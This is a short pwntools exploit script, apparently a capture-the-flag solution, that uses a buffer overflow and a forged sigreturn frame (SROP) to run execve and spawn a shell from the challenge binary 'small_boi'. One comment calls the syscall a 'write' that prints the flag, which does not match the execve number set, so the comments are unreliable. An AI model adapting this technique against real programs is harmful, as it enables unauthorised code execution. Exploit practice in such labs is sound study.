from pwn import *

target = process('./small_boi')
# gdb.attach(target, gdbscript='b *0x004001a4')

# Specify the architecture
context.arch = 'amd64'

frame = SigreturnFrame()

# set return pointer to a syscall
frame.rip = 0x004001c5

# set the values to trigger a write syscall that will print the flag
frame.rax = 0x3b
frame.rdi = 0x004001ca
frame.rsi = 0x0
frame.rdx = 0x0  # adjust this one if necessary, 0x400 is probably the max (whole stack)

sigreturn_addr = p64(0x0040017c)

payload = b'\x00' * 0x28
payload += sigreturn_addr
payload += bytes(frame)[8:]

target.send(payload)
target.interactive()
